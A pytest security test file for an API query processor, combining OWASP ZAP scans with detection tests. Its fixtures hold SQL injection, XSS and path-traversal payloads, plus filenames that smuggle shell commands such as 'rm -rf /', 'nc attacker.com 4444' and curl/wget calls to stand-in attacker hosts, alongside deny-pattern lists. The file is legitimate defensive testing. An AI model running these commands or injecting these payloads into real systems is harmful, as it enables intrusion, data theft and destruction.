"""
OWASP ZAP Security Testing Integration
Automated security testing for API endpoints using OWASP ZAP
"""

import pytest
import requests
import json
import time
import subprocess
import os
from pathlib import Path
from unittest.mock import patch
import sys

# Add source paths
sys.path.insert(0, 'src/rag_query_processor')


class TestOWASPZAPIntegration:
    """Test OWASP ZAP security scanning integration"""
    
    @pytest.fixture(scope="class")
    def zap_setup(self):
        """Setup OWASP ZAP for testing"""
        # Note: This requires OWASP ZAP to be installed
        # In CI/CD, this would be handled by Docker container
        zap_config = {
            'zap_proxy': 'http://localhost:8080',
            'target_url': 'http://localhost:3000',  # Mock API endpoint
            'api_key': 'test-api-key'
        }
        
        # Check if ZAP is available
        try:
            response = requests.get(f"{zap_config['zap_proxy']}/JSON/core/view/version/")
            if response.status_code == 200:
                yield zap_config
            else:
                pytest.skip("OWASP ZAP not available")
        except requests.exceptions.ConnectionError:
            pytest.skip("OWASP ZAP not running")
    
    def test_api_vulnerability_scan(self, zap_setup):
        """Test API vulnerability scanning with ZAP"""
        zap_config = zap_setup
        
        # Define API endpoints to test
        api_endpoints = [
            {'method': 'GET', 'path': '/health'},
            {'method': 'POST', 'path': '/query', 'data': {'question': 'test'}},
            {'method': 'OPTIONS', 'path': '/query'}
        ]
        
        scan_results = []
        
        for endpoint in api_endpoints:
            # Spider the endpoint
            spider_url = f"{zap_config['zap_proxy']}/JSON/spider/action/scan/"
            spider_params = {
                'url': f"{zap_config['target_url']}{endpoint['path']}",
                'apikey': zap_config['api_key']
            }
            
            try:
                spider_response = requests.get(spider_url, params=spider_params)
                if spider_response.status_code == 200:
                    scan_id = spider_response.json().get('scan')
                    
                    # Wait for spider to complete
                    time.sleep(2)
                    
                    # Get spider results
                    results_url = f"{zap_config['zap_proxy']}/JSON/spider/view/results/"
                    results_params = {'scanId': scan_id, 'apikey': zap_config['api_key']}
                    results_response = requests.get(results_url, params=results_params)
                    
                    if results_response.status_code == 200:
                        scan_results.append({
                            'endpoint': endpoint['path'],
                            'scan_id': scan_id,
                            'results': results_response.json()
                        })
            except Exception as e:
                # In real implementation, would log error
                scan_results.append({
                    'endpoint': endpoint['path'],
                    'error': str(e)
                })
        
        # Verify scan completed
        assert len(scan_results) > 0
    
    def test_active_security_scan(self, zap_setup):
        """Test active security scanning"""
        zap_config = zap_setup
        
        # Start active scan
        scan_url = f"{zap_config['zap_proxy']}/JSON/ascan/action/scan/"
        scan_params = {
            'url': zap_config['target_url'],
            'apikey': zap_config['api_key']
        }
        
        try:
            scan_response = requests.get(scan_url, params=scan_params)
            if scan_response.status_code == 200:
                scan_id = scan_response.json().get('scan')
                
                # Wait for scan to start
                time.sleep(5)
                
                # Check scan status
                status_url = f"{zap_config['zap_proxy']}/JSON/ascan/view/status/"
                status_params = {'scanId': scan_id, 'apikey': zap_config['api_key']}
                status_response = requests.get(status_url, params=status_params)
                
                assert status_response.status_code == 200
                status_data = status_response.json()
                assert 'status' in status_data
                
        except Exception as e:
            pytest.skip(f"Active scan failed: {e}")
    
    def test_vulnerability_report_generation(self, zap_setup):
        """Test vulnerability report generation"""
        zap_config = zap_setup
        
        # Get alerts (vulnerabilities)
        alerts_url = f"{zap_config['zap_proxy']}/JSON/core/view/alerts/"
        alerts_params = {'apikey': zap_config['api_key']}
        
        try:
            alerts_response = requests.get(alerts_url, params=alerts_params)
            if alerts_response.status_code == 200:
                alerts_data = alerts_response.json()
                alerts = alerts_data.get('alerts', [])
                
                # Categorize vulnerabilities by risk level
                vulnerability_summary = {
                    'high': [],
                    'medium': [],
                    'low': [],
                    'informational': []
                }
                
                for alert in alerts:
                    risk_level = alert.get('risk', 'informational').lower()
                    if risk_level in vulnerability_summary:
                        vulnerability_summary[risk_level].append({
                            'name': alert.get('alert', 'Unknown'),
                            'description': alert.get('description', ''),
                            'url': alert.get('url', ''),
                            'solution': alert.get('solution', '')
                        })
                
                # Security assertions
                assert len(vulnerability_summary['high']) == 0, f"High risk vulnerabilities found: {vulnerability_summary['high']}"
                
                # Medium risk vulnerabilities should be minimal
                if len(vulnerability_summary['medium']) > 5:
                    pytest.fail(f"Too many medium risk vulnerabilities: {len(vulnerability_summary['medium'])}")
                
                # Generate report
                report_data = {
                    'scan_timestamp': time.time(),
                    'target_url': zap_config['target_url'],
                    'vulnerability_summary': vulnerability_summary,
                    'total_alerts': len(alerts)
                }
                
                # Save report
                with open('security_scan_report.json', 'w') as f:
                    json.dump(report_data, f, indent=2)
                
                print(f"Security scan completed. Found {len(alerts)} total alerts.")
                
        except Exception as e:
            pytest.skip(f"Report generation failed: {e}")


class TestSecurityTestingTools:
    """Test security testing tools and utilities"""
    
    def test_sql_injection_detection(self):
        """Test SQL injection detection capabilities"""
        from src.rag_query_processor.lambda_function import QueryProcessor
        
        processor = QueryProcessor()
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM sensitive_data --",
            "admin'--",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_payloads:
            query = f"What is energy data {payload}"
            result = processor.preprocess_query(query)
            
            # Should detect and sanitize SQL injection attempts
            assert "DROP TABLE" not in result['processed_query']
            assert "UNION SELECT" not in result['processed_query']
            assert "xp_cmdshell" not in result['processed_query']
            assert "OR '1'='1" not in result['processed_query']
    
    def test_xss_detection(self):
        """Test XSS detection capabilities"""
        from src.rag_query_processor.lambda_function import QueryProcessor
        
        processor = QueryProcessor()
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<body onload=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            query = f"Show me data {payload}"
            result = processor.preprocess_query(query)
            
            # Should detect and sanitize XSS attempts
            assert "<script>" not in result['processed_query']
            assert "<img" not in result['processed_query']
            assert "<svg" not in result['processed_query']
            assert "javascript:" not in result['processed_query']
            assert "<iframe" not in result['processed_query']
            assert "onload=" not in result['processed_query']
    
    def test_command_injection_detection(self):
        """Test command injection detection"""
        # Test file processing security
        malicious_filenames = [
            "data.csv; rm -rf /",
            "report.pdf && cat /etc/passwd",
            "file.xlsx | nc attacker.com 4444",
            "data.csv`whoami`",
            "file.pdf; curl http://evil.com/steal",
            "data.xlsx && wget http://malware.com/payload"
        ]
        
        def secure_filename_validator(filename):
            """Validate filename for security"""
            dangerous_patterns = [
                ';', '&&', '||', '|', '`', '$(',
                'rm ', 'cat ', 'nc ', 'curl ', 'wget ',
                '/etc/', '/bin/', '/usr/', 'system32'
            ]
            
            filename_lower = filename.lower()
            for pattern in dangerous_patterns:
                if pattern in filename_lower:
                    return False
            return True
        
        for filename in malicious_filenames:
            is_safe = secure_filename_validator(filename)
            assert is_safe is False, f"Malicious filename not detected: {filename}"
    
    def test_directory_traversal_detection(self):
        """Test directory traversal detection"""
        # Path traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        def secure_path_validator(path):
            """Validate path for security"""
            import urllib.parse
            
            # Decode URL encoding
            decoded_path = urllib.parse.unquote(path)
            
            # Check for traversal patterns
            dangerous_patterns = [
                '..', '\\', '/etc/', '/bin/', '/usr/',
                'system32', 'windows', 'config'
            ]
            
            path_lower = decoded_path.lower()
            for pattern in dangerous_patterns:
                if pattern in path_lower:
                    return False
            return True
        
        for payload in traversal_payloads:
            is_safe = secure_path_validator(payload)
            assert is_safe is False, f"Directory traversal not detected: {payload}"


class TestPenetrationTestingSimulation:
    """Test penetration testing simulation"""
    
    def test_authentication_bypass_attempts(self):
        """Test authentication bypass detection"""
        # Simulate various authentication bypass attempts
        bypass_attempts = [
            {'user': 'admin', 'password': 'admin'},
            {'user': 'admin', 'password': ''},
            {'user': '', 'password': 'password'},
            {'user': 'admin\' OR \'1\'=\'1', 'password': 'anything'},
            {'user': 'admin', 'password': '\' OR \'1\'=\'1'},
            {'user': '../admin', 'password': 'password'}
        ]
        
        def simulate_authentication(user, password):
            """Simulate authentication process"""
            # Secure authentication logic
            if not user or not password:
                return False
            
            # Check for SQL injection attempts
            dangerous_chars = ['\'', '"', ';', '--', '/*', '*/', 'OR ', 'AND ']
            for char in dangerous_chars:
                if char.lower() in user.lower() or char.lower() in password.lower():
                    return False
            
            # Check for path traversal
            if '..' in user or '\\' in user or '/' in user:
                return False
            
            # Simulate valid credentials check
            valid_credentials = [
                ('admin', 'SecurePassword123!'),
                ('user', 'UserPassword456!')
            ]
            
            return (user, password) in valid_credentials
        
        # Test bypass attempts
        successful_bypasses = 0
        for attempt in bypass_attempts:
            if simulate_authentication(attempt['user'], attempt['password']):
                successful_bypasses += 1
        
        # Should not allow any bypasses
        assert successful_bypasses == 0, f"Authentication bypass detected: {successful_bypasses} successful attempts"
    
    def test_privilege_escalation_detection(self):
        """Test privilege escalation detection"""
        # Simulate user roles and permissions
        user_permissions = {
            'guest': ['read_public'],
            'user': ['read_public', 'read_user_data'],
            'admin': ['read_public', 'read_user_data', 'read_admin_data', 'write_data', 'delete_data']
        }
        
        # Privilege escalation attempts
        escalation_attempts = [
            {'user': 'guest', 'requested_permission': 'read_admin_data'},
            {'user': 'user', 'requested_permission': 'delete_data'},
            {'user': 'guest', 'requested_permission': 'write_data'},
            {'user': 'user', 'requested_permission': 'read_admin_data'}
        ]
        
        def check_permission(user_role, requested_permission):
            """Check if user has requested permission"""
            user_perms = user_permissions.get(user_role, [])
            return requested_permission in user_perms
        
        # Test escalation attempts
        successful_escalations = 0
        for attempt in escalation_attempts:
            if check_permission(attempt['user'], attempt['requested_permission']):
                successful_escalations += 1
        
        # Should not allow privilege escalation
        assert successful_escalations == 0, f"Privilege escalation detected: {successful_escalations} successful attempts"
    
    def test_data_exfiltration_detection(self):
        """Test data exfiltration detection"""
        # Simulate data access patterns that might indicate exfiltration
        access_patterns = [
            {'user': 'user1', 'requests_per_minute': 100, 'data_volume_mb': 50},
            {'user': 'user2', 'requests_per_minute': 5, 'data_volume_mb': 1000},
            {'user': 'user3', 'requests_per_minute': 200, 'data_volume_mb': 200},
            {'user': 'user4', 'requests_per_minute': 10, 'data_volume_mb': 5}
        ]
        
        def detect_suspicious_activity(pattern):
            """Detect suspicious data access patterns"""
            # Thresholds for suspicious activity
            max_requests_per_minute = 50
            max_data_volume_mb = 100
            
            suspicious_indicators = []
            
            if pattern['requests_per_minute'] > max_requests_per_minute:
                suspicious_indicators.append('high_request_rate')
            
            if pattern['data_volume_mb'] > max_data_volume_mb:
                suspicious_indicators.append('high_data_volume')
            
            # Combined threshold - high requests AND high volume
            if (pattern['requests_per_minute'] > 20 and 
                pattern['data_volume_mb'] > 50):
                suspicious_indicators.append('potential_exfiltration')
            
            return suspicious_indicators
        
        # Analyze access patterns
        suspicious_users = []
        for pattern in access_patterns:
            indicators = detect_suspicious_activity(pattern)
            if indicators:
                suspicious_users.append({
                    'user': pattern['user'],
                    'indicators': indicators
                })
        
        # Should detect suspicious patterns
        assert len(suspicious_users) > 0, "Failed to detect suspicious data access patterns"
        
        # Verify specific detections
        user3_detected = any(u['user'] == 'user3' for u in suspicious_users)
        assert user3_detected, "Failed to detect user with high request rate and volume"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])